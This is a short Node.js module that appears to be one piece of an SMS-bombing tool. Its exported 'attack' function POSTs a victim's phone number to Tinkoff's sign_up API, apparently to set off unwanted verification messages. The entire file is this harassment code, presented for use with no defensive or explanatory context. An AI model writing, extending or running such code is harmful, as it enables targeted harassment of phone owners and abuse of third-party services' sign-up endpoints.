//requirements
const fetch = require('node-fetch')
const FormData = require('form-data')
//consts
const delay = 5000
const disable = 10000

function b_tinkoff(number){
    const payload = new FormData()
    payload.append('phone', number)
    fetch('https://api.tinkoff.ru/v1/sign_up', {
        method: 'post',
        body: payload
    })
        .then(r => r.status)
        .then(r => console.log('Tinkoff: '+r))
        .catch(e => console.log(e))
}

this.attack = function attack(number) {
    b_tinkoff(number)
}